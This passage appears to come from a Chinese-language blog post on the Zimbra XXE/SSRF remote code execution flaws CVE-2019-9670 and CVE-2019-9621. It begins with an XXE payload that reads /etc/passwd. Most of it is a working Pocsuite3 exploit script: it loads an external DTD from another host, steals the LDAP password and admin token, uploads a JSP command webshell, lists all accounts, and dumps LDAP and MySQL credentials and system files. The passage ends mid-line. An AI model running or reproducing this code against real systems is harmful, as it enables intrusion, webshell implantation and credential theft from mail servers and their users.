<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Request</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EMailAddress</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">EMailAddress</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">AcceptableResponseSchema</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">AcceptableResponseSchema</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Request</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p>此时email不为空且responseSchema的值为&#x2F;etc&#x2F;passwd的内容，攻击者可以成功读取&#x2F;etc&#x2F;passwd的值：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bec516ea21b9a9e42c512.jpg" title="image-20230403131401470" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec516ea21b9a9e42c512.jpg" alt="image-20230403131401470"></a></p>
<p>可以看到返回的结果正是<code>Requested response schema not available + /etc/passwd</code>，之后的adminToken的获取也正是基于此原理读取&#x2F;opt&#x2F;zimbra&#x2F;conf&#x2F;localconfig.xml文件获取zimbra_ldap_password。不过因为localconfig.xml文件会在解析器中被解析，无法以文本形式通过XXE漏洞被读出，需要加上<code>&lt;![CDATA[]]&gt;</code>，所以采用外部DTD的方式读取。</p>
<h3 id="Pocsuite-POC"><a href="#Pocsuite-POC" class="headerlink" title="Pocsuite-POC"></a>Pocsuite-POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    minimum_version_required, POCBase, register_poc, requests, logger,</span><br><span class="line">    OptString, OrderedDict,</span><br><span class="line">    random_str, Output,</span><br><span class="line">    get_listener_ip, get_listener_port, REVERSE_PAYLOAD</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PoC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;Zimbra 远程代码执行漏洞&#x27;</span></span><br><span class="line">    author = <span class="string">&#x27;rainb0w&#x27;</span></span><br><span class="line">    is0day = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;远程代码执行&#x27;</span></span><br><span class="line">    <span class="comment"># 严重 高危 中危 低危</span></span><br><span class="line">    level = <span class="string">&#x27;严重&#x27;</span></span><br><span class="line">    CVE = <span class="string">&#x27;CVE-2019-9670 CVE-2019-9621&#x27;</span></span><br><span class="line">    CNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    CNNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ExploitDB = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Vendor = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appVersion = [<span class="string">&#x27;Zimbra &lt; 8.7.11&#x27;</span>]</span><br><span class="line">    Tags = []</span><br><span class="line">    search_keyword = <span class="string">&#x27;title=&quot;Zimbra 管理&quot;&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra提供一套开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。它最大的特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox,Safari和IE浏览器。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    details = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    当 Zimbra 存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取 localconfig.xml配置文件，获取到 zimbra admin ldap password，并通过 7071 admin 端口进行 SOAP AuthRequest 认证，得到 admin authtoken漏洞是利用XXE和ProxyServlet SSRF 漏洞拿到 admin authtoken 后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra服务端打来Memcached缓存服务是，可以利用SSRF攻击进行反序列化执行远程代码。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra 官方下载最新版本进行修复:https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    official_solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    references = []</span><br><span class="line">    samples = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_Vulnerable</span>(<span class="params">self</span>):</span><br><span class="line">        xml_check = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="string">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span></span><br><span class="line"><span class="string"> &lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">      &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span></span><br><span class="line"><span class="string">      &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">  &lt;/Autodiscover&gt;&quot;&quot;&quot;</span></span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/Autodiscover/Autodiscover.xml&#x27;</span>, data=xml_check.encode(<span class="string">&#x27;utf-8&#x27;</span>),verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error 503 Requested response&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_adminToken</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#https://raw.githubusercontent.com/nth347/Zimbra-RCE-exploit/master/malicious_dtd</span></span><br><span class="line">        xml1 = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE Autodiscover [</span></span><br><span class="line"><span class="string">        &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.135.1:1234/1.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">        %dtd;</span></span><br><span class="line"><span class="string">        %all;</span></span><br><span class="line"><span class="string">        ]&gt;</span></span><br><span class="line"><span class="string">&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span></span><br><span class="line"><span class="string">        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">&lt;/Autodiscover&gt;&quot;&quot;&quot;</span></span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/Autodiscover/Autodiscover.xml&#x27;</span>, data=xml1.encode(<span class="string">&#x27;utf-8&#x27;</span>),verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&amp;lt;/key&amp;gt;\s*&amp;lt;key name=&quot;zimbra_ldap_password&quot;&amp;gt;\s*&amp;lt;value&amp;gt;(.*?)&amp;lt;/value&amp;gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            password = re.findall(pattern, r.text)[<span class="number">0</span>]</span><br><span class="line">            xml2 = <span class="string">&quot;&quot;&quot;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;</span></span><br><span class="line"><span class="string">               &lt;soap:Header&gt;</span></span><br><span class="line"><span class="string">                   &lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span></span><br><span class="line"><span class="string">                       &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;</span></span><br><span class="line"><span class="string">                   &lt;/context&gt;</span></span><br><span class="line"><span class="string">               &lt;/soap:Header&gt;</span></span><br><span class="line"><span class="string">               &lt;soap:Body&gt;</span></span><br><span class="line"><span class="string">                 &lt;AuthRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;</span></span><br><span class="line"><span class="string">                    &lt;password&gt;&#123;&#125;&lt;/password&gt;</span></span><br><span class="line"><span class="string">                 &lt;/AuthRequest&gt;</span></span><br><span class="line"><span class="string">               &lt;/soap:Body&gt;</span></span><br><span class="line"><span class="string">            &lt;/soap:Envelope&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(password)</span><br><span class="line">            r = requests.post(self.url + <span class="string">&#x27;/service/admin/soap&#x27;</span>, data=xml2.encode(<span class="string">&#x27;utf-8&#x27;</span>), verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;ZM_ADMIN_AUTH_TOKEN=(.*?);&#x27;</span>)</span><br><span class="line">            adminToken = re.findall(pattern, r.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">            adminToken = <span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=&quot;</span> + adminToken</span><br><span class="line">            <span class="keyword">return</span> adminToken</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_webshell</span>(<span class="params">self</span>):</span><br><span class="line">        self.adminToken = self.get_adminToken()</span><br><span class="line">        fileName = random_str(<span class="number">7</span>)+<span class="string">&quot;.jsp&quot;</span></span><br><span class="line">        file = &#123;</span><br><span class="line">            <span class="string">&#x27;filename1&#x27;</span>: (<span class="literal">None</span>, <span class="string">&quot;whocare&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">            <span class="string">&#x27;clientFile&#x27;</span>: (fileName,</span><br><span class="line">                           <span class="string">r&quot;&quot;&quot;&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    Runtime rt = Runtime.getRuntime();</span></span><br><span class="line"><span class="string">    String cmd = request.getParameter(&quot;sMuw1P2&quot;);</span></span><br><span class="line"><span class="string">    Process process = rt.exec(cmd);</span></span><br><span class="line"><span class="string">    java.io.InputStream in = process.getInputStream();</span></span><br><span class="line"><span class="string">    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span><br><span class="line"><span class="string">    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span><br><span class="line"><span class="string">    String s = null;</span></span><br><span class="line"><span class="string">    while ((s = stdInput.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.println(s);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&quot;&quot;&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;text/plain&quot;</span>),</span><br><span class="line">            <span class="string">&#x27;requestId&#x27;</span>: (<span class="literal">None</span>, <span class="string">&quot;12&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">        &#125;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: self.adminToken,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(self.url + <span class="string">&quot;/service/extension/clientUploader/upload&quot;</span>, files=file, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        self.webshell = (fileName, <span class="string">&quot;sMuw1P2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">self, command</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: self.adminToken,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;<span class="string">&#x27;sMuw1P2&#x27;</span>: command&#125;</span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/downloads/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshell[<span class="number">0</span>]), data=data, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetAllAccountsRequest</span>(<span class="params">self</span>):</span><br><span class="line">        xml = <span class="string">&quot;&quot;&quot;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;&lt;soap:Header&gt;&lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;authToken&gt;&#123;&#125;&lt;/authToken&gt;</span></span><br><span class="line"><span class="string">&lt;/context&gt;&lt;/soap:Header&gt;&lt;soap:Body&gt;</span></span><br><span class="line"><span class="string">&lt;GetAllAccountsRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/GetAllAccountsRequest&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(self.adminToken.replace(<span class="string">&#x27;ZM_ADMIN_AUTH_TOKEN=&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/service/admin/soap&#x27;</span>, data=xml.encode(<span class="string">&#x27;utf-8&#x27;</span>), verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        users = []</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;account name=&quot;(.*?)&quot; id=&quot;(.*?)&quot;&gt;[\s\S]*?&lt;a n=&quot;cn&quot;&gt;(.*?)&lt;/a&gt;[\s\S]*?&lt;a n=&quot;sn&quot;&gt;(.*?)&lt;/a&gt;[\s\S]*?&lt;/account&gt;&#x27;</span>)</span><br><span class="line">        result = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">            userinfo = &#123;<span class="string">&#x27;zimbraId&#x27;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;sn&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;cn&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">            userinfo[<span class="string">&#x27;email&#x27;</span>] = i[<span class="number">0</span>]</span><br><span class="line">            userinfo[<span class="string">&#x27;zimbraId&#x27;</span>] = i[<span class="number">1</span>]</span><br><span class="line">            userinfo[<span class="string">&#x27;cn&#x27;</span>] = i[<span class="number">2</span>]</span><br><span class="line">            userinfo[<span class="string">&#x27;sn&#x27;</span>] = i[<span class="number">3</span>]</span><br><span class="line">            users.append(userinfo.copy())</span><br><span class="line">        <span class="keyword">return</span> users</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">self</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: self.adminToken,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(self.url+<span class="string">&#x27;/zimbraAdmin&#x27;</span>, verify=<span class="literal">False</span>, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;</span>)</span><br><span class="line">        url_title = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> url_title[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ldap_and_mysql_Info</span>(<span class="params">self</span>):</span><br><span class="line">        zmlocalconfig = self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmlocalconfig -s&#x27;</span>)</span><br><span class="line">        pattern_ldap_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_password = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ladp_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_url = re.<span class="built_in">compile</span>(<span class="string">&#x27;ldap_url = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_address = re.<span class="built_in">compile</span>(<span class="string">&#x27;mysql_bind_address = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_password = (.*)&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ldap_Pass = re.findall(pattern_ldap_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_user = re.findall(pattern_ladp_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_url = re.findall(pattern_ldap_url, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_address = re.findall(pattern_mysql_address, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_username = re.findall(pattern_mysql_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_Pass = re.findall(pattern_mysql_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        self.raw_url = self.url</span><br><span class="line">        self.host = urlparse(self.url).hostname</span><br><span class="line">        self.port = urlparse(self.url).port</span><br><span class="line">        <span class="keyword">if</span> self.port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port = <span class="number">443</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.check_Vulnerable():</span><br><span class="line">                self.upload_webshell()</span><br><span class="line">                result[<span class="string">&quot;url&quot;</span>] = self.url+<span class="string">&#x27;/zimbraAdmin&#x27;</span></span><br><span class="line">                <span class="comment"># Web网站相关信息</span></span><br><span class="line">                result[<span class="string">&quot;web&quot;</span>] = &#123;</span><br><span class="line">                    <span class="comment"># 网站默认首页的title信息（可能含有单位或组织信息）</span></span><br><span class="line">                    <span class="string">&quot;title&quot;</span>: self.get_title(),</span><br><span class="line">                    <span class="comment">#所有账户信息</span></span><br><span class="line">                    <span class="string">&quot;users&quot;</span>: self.GetAllAccountsRequest()</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment"># 凭据类信息，针对各类弱口令、默认口令漏洞</span></span><br><span class="line">                ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass = self.get_ldap_and_mysql_Info()</span><br><span class="line">                result[<span class="string">&quot;login_credentials&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: ldap_user, <span class="string">&quot;password&quot;</span>: ldap_Pass,<span class="string">&quot;ldap_url&quot;</span>: ldap_url, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;ldap&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: mysql_username, <span class="string">&quot;password&quot;</span>: mysql_Pass, <span class="string">&quot;mysql_bind_address&quot;</span>: mysql_address, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;mysql&quot;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 获取的文件信息, 针对各类文件读取类漏洞</span></span><br><span class="line">                result[<span class="string">&quot;files&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/passwd&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/hosts&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/hosts&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;shadow&quot;</span>, <span 